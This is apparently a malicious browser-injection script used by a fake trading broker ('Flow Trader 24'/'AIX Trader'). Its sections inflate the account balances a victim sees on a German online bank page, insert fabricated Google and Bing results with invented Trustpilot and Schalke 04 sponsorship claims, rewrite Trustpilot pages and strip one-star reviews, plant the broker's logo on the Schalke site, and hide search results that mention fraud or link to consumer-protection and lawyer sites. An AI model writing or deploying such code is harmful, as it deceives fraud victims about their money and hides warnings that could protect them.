//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


     if (window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("11280968645") > 0 ) {

    // Configurable values
    var desiredIBAN = accountsecurity; // Your desired IBAN in '     '
    var useSameAdjustmentAmount = true; // Set to true to use the same adjustment amount for all balances
    var adjustmentAmount = xamount; // The adjustment amount to use if "useSameAdjustmentAmount" is true
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 3000.50 },
        { index: 1, adjustmentAmount: 3000.70 },
        { index: 2, adjustmentAmount: 3000.90 },
        { index: 3, adjustmentAmount: 3000.10 }
    ];

    // Function to remove elements containing the text "Druckansicht"
    var elementsToRemoveDruckansicht = document.evaluate("//*[contains(text(),'Druckansicht')]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
    for (var i = 0; i < elementsToRemoveDruckansicht.snapshotLength; i++) {
        var element = elementsToRemoveDruckansicht.snapshotItem(i);
        element.remove();
    }

    // Extract IBAN from the <strong> tag within the first identifier element
    var firstIdentifierElement = document.querySelector('.mkp-identifier-description strong');

    if (firstIdentifierElement) {
        var identifierText = firstIdentifierElement.textContent.trim().replace(/\s/g, ''); // Remove whitespace

        console.log('Extracted IBAN:', identifierText); // Log the extracted IBAN

        var desiredIBANNormalized = desiredIBAN.replace(/\s/g, ''); // Remove whitespace from desired IBAN

        // Check if either the entire IBAN matches or at least the last 9 characters match
        if (identifierText === desiredIBANNormalized || identifierText.endsWith(desiredIBANNormalized.slice(-9))) {
            console.log('IBAN matches. Balance changer started.');

            function changeBalance(balanceElement, adjustmentAmount) {
                var currentBalanceText = balanceElement.textContent.trim();
                var currentBalanceValue = parseFloat(currentBalanceText.replace(/[^\d,-]+/g, '').replace(',', '.'));

                if (!isNaN(currentBalanceValue)) {
                    var newBalanceValue = currentBalanceValue + adjustmentAmount;
                    var newBalanceText = formatBalance(newBalanceValue) + ' EUR'; // Add "EUR" currency symbol

                    // Update the balance text with the correct sign
                    if (newBalanceValue < 0) {
                        newBalanceText = '-' + newBalanceText.replace('-', ''); // Add negative sign if the balance is negative
                    }

                    // Change the class to "minus" if the balance is negative
                    if (newBalanceValue < 0) {
                        balanceElement.classList.remove('plus');
                        balanceElement.classList.add('minus');
                    } else {
                        balanceElement.classList.remove('minus');
                        balanceElement.classList.add('plus');
                    }

                    // Update the balance element with the new value and text
                    balanceElement.textContent = newBalanceText;

                    console.log('Balance changed from ' + currentBalanceText + ' to ' + newBalanceText);
                } else {
                    console.log('Failed to parse current balance value.');
                }
            }

            // Iterate through the balance configurations and apply changes
            if (useSameAdjustmentAmount) {
                BALANCE_CONFIGS.forEach(function(config) {
                    var balanceElements = document.querySelectorAll('.plus, .minus');
                    if (config.index < balanceElements.length) {
                        var balanceElement = balanceElements[config.index];
                        changeBalance(balanceElement, adjustmentAmount);
                    } else {
                        console.log('Balance element not found for index ' + config.index);
                    }
                });
            } else {
                var balanceElements = document.querySelectorAll('.plus, .minus');
                balanceElements.forEach(function(balanceElement, index) {
                    var config = BALANCE_CONFIGS.find(function(cfg) {
                        return cfg.index === index;
                    });
                    if (config) {
                        changeBalance(balanceElement, config.adjustmentAmount);
                    } else {
                        console.log('No configuration found for balance element at index ' + index);
                    }
                });
            }

            // Function to format the balance with correct separators
            function formatBalance(balance) {
                var formattedBalance = balance.toFixed(2).replace(/\./g, ','); // Use comma as decimal separator
                return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, "."); // Add dots as thousands separators
            }
        } else {
            console.log('IBAN does not match. Balance changer not executed.');
        }
    } else {
        console.log('No <strong> element found within the "mkp-identifier-description" class.');
    }
}

 // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1
    && window.location.href.indexOf("ing.de") === -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["aix", "trader", "aixtrader", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust", "aix trader", "aix-trader", "flow", "flowtrade", "flowtrader", "trader", "flow trader", "24", "ing", "targo", "targobank", "diba", "login"],
                        results: [
                            {
                                url: "https://cfd.flowtrade24.com/",
                                title: "Flow Trader 24 dein Broker",
                                description: "AIX Trader ist der Broker mit der besten Reputation.",
                                footerText: "https://cfd.flowtrade24.com/",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von Flow Trader 24 - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker Flow Trader 24",
                                footerText: "https://de.trustpilot.com/review/amadeusmarkets.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "Flow Trader 24 Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Flow Trader 24 ab dem 1. Januar unser Sponsor und Partner wird. Flow Trader 24 ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Flow Traders 24 sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}


// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "AIX Trader";
    const customLogoURL = "https://p-cdn.co/flowtraders24/brands/flowtraders24/logo-white.png";
    const customURL = "https://cfd.flowtrade24.com/";
    const customReferenceURL = "flowtrade24.com";
    const customLinkURL = "https://cfd.flowtrade24.com/"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "Flow Trader 24",
      "icmarkets": "Flow Trader 24",
      "ic-markets": "Flow Trader 24",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}


// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  var newURL = "https://cfd.flowtrade24.com/";
var newLogoURL = "https://i.ibb.co/M2gXMFt/Copy-of-Untitled-Design.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var sobserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

sobserver.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1 &&
        window.location.href.indexOf("ing.de") === -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung', 'seriös' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://www.example1.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }



})();









